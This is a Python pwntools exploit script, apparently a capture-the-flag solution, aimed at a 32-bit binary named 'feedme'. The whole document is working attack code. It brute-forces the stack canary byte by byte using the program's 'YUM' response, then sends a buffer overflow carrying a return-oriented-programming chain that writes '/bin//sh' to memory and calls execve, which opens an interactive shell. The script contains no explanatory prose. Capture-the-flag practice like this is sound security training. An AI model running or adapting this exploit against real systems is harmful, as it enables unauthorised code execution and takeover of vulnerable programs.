from pwn import *
from struct import pack

r = process("./feedme")
#gdb.attach(r)

canary = "\x00"
lenCanary = 34

for i in range(3):
	for val in range(256):
		r.send(chr(lenCanary))
		r.send("A" * 32 + canary + chr(val))

		output = r.recvuntil("exit.")
		if "YUM" in output:
			canary = canary + chr(val)
			lenCanary += 1
			break

log.info("{}".format(canary.encode("hex")))


# Padding goes here
p = ''

p += pack('<I', 0x0806f34a) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080bb496) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x0809a7ed) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806f34a) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x080bb496) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x0809a7ed) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806f34a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08054a10) # xor eax, eax ; ret
p += pack('<I', 0x0809a7ed) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x0806f371) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x080ea060) # padding without overwrite ebx
p += pack('<I', 0x0806f34a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08054a10) # xor eax, eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x08049761) # int 0x80

# padding, canary, padding, base pointer, ropchain
r.send(chr(32 + 4 + 8 + 4 + len(p))) 
r.send("A" * 32 + canary + "A" * 8 + "BBBB" + p)

r.interactive()



